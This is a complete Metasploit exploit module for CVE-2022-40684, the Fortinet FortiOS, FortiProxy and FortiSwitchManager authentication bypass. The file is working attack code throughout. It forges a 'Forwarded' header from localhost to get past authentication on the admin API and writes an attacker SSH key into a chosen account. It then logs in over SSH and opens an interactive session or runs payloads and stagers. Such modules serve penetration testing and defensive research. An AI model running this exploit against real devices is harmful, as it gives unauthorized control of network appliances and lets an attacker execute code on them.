##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SSH
  # include Msf::Exploit::Remote::Tcp
  # include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  attr_accessor :ssh_socket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability
          in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API
          to gain access to a choosen account. And then add a SSH key to the
          authorized_keys file of the choosen account, allowing
          to login to the system with the choosen account.

          Successful exploitation results in remote code execution.
        },
        'Author' => [
          'Heyder Andrade <@HeyderAndrade>', # Metasploit module
          'Zach Hanley <@hacks_zach>', # PoC

        ],
        'References' => [
          ['CVE', '2022-40684'],
          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-22-377'],
          ['URL', 'https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684'],
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2022-10-11', # Vendor advisory
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Interactive SSH',
            {
              'DefaultOptions' => {
                'PAYLOAD' => 'generic/ssh/interact',
                'WfsDelay' => 5
              },
              'Payload' => {
                'Compat' => {
                  'PayloadType' => 'ssh_interact'
                }
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
          # 'PrependFork' => true,
          # 'MeterpreterTryToFork' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            IOC_IN_LOGS,
            ARTIFACTS_ON_DISK # SSH key is added to authorized_keys file
          ]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/']),
        OptString.new('USERNAME', [true, 'Target Username', 'admin']),
        OptString.new('SSH_KEY', [false, 'SSH private key to be used', nil]),
        OptString.new('SSH_RPORT', [true, 'SSH port to connect to', 22]),
      ]
    )
    register_advanced_options([
      OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
    ])
  end

  def username
    datastore['USERNAME']
  end

  def ssh_rport
    datastore['SSH_RPORT']
  end

  def headers
    {
      'Forwarded' => 'for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"'
    }
  end

  def authorized_keys
    pubkey = Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)
    "#{ssh_keygen.ssh_type} #{pubkey} #{username}@localhost"
  end

  def ssh_pubkey
    Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)
  end

  def ssh_private_key
    ssh_keygen.to_pem
  end

  def ssh_keygen
    if datastore['SSH_KEY']
      @ssh_keygen ||= Net::SSH::KeyFactory.load_data_private_key(File.read(datastore['SSH_KEY']), nil, datastore['SSH_KEY'])
    else
      @ssh_keygen ||= OpenSSL::PKey::RSA.new(2048)
    end
  end

  def check
    print_status("Checking #{datastore['RHOST']}:#{datastore['RPORT']}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/api/v2/cmdb/system/admin/#{username}"),
      'ctype' => 'application/json'
    })

    return CheckCode::Unknown('Target did not respond to check.') unless res
    return CheckCode::Safe('Target is not vulnerable.') unless res.code == 401

    Socket.tcp(rhost, ssh_rport, connect_timeout: 5) { |sock| return CheckCode::Safe('SSH is not open, so adding a SSH key wouldn\'t work') unless sock }
    CheckCode::Appears('Target seems vulnerable')
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing #{cmd}")
    begin
      Timeout.timeout(datastore['SSH_TIMEOUT']) { ssh_socket.exec!(cmd) }
    rescue Timeout::Error
      print_warning('Timed out while waiting for command to return')
      @timeout = true
    end
  end

  def add_ssh_key
    vprint_status('Adding SSH key to authorized_keys file')
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, "/api/v2/cmdb/system/admin/#{username}"),
      'ctype' => 'application/json',
      'agent' => 'Report Runner',
      'headers' => headers,
      'data' => {
        'ssh-public-key1' => "\"#{authorized_keys}\""
      }.to_json
    })
    fail_with(Failure::UnexpectedReply, 'Failed to add SSH key to authorized_keys file') unless res&.code == 500
    body = res.get_json_document
    fail_with(Failure::UnexpectedReply, 'Failed to add SSH key to authorized_keys file') unless body.key?('cli_error') && body['cli_error'] =~ /SSH key is good/
  end

  def do_login(ssh_options)
    # ensure we don't have a stale socket hanging around
    ssh_options[:proxy].proxies = nil if ssh_options[:proxy]
    # ssh_socket = nil
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        self.ssh_socket = Net::SSH.start(rhost, username, ssh_options)
      end
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::NoAccess, 'Failed authentication')
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket
  end

  def binary_exists(binary, platform: nil)
    Msf::Sessions::CommandShell.binary_exists(binary, platform: platform, &method(:execute_command))
  end

  def execute_python
    python_binary = binary_exists('python', platform: 'unix')
    python_binary ||= binary_exists('python3', platform: 'unix')
    python_binary ||= binary_exists('python2', platform: 'unix')
    fail_with(Failure::NoTarget, 'Python was not found on the target system') if python_binary.nil?

    execute_command("echo \"#{payload.encoded}\" | #{python_binary}")
  end

  def exploit
    print_status("Executing exploit on #{target.name}")
    add_ssh_key
    print_status('Establishing SSH connection')
    ssh_options = ssh_client_defaults.merge({
      auth_methods: ['publickey'],
      key_data: [ ssh_private_key ],
      port: ssh_rport
    })
    ssh_options.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    do_login(ssh_options)

    if target.name == 'Interactive SSH'
      handler(ssh_socket)
      return
    end

    print_status("#{datastore['RHOST']}:#{datastore['RPORT']} - Sending stager...")

    case target['Platform']
    when 'python'
      execute_python
    when 'unix'
      execute_command(payload.encoded)
    else
      execute_cmdstager(linemax: 500)
    end

    @timeout ? ssh_socket.shutdown! : ssh_socket.close
  end
end
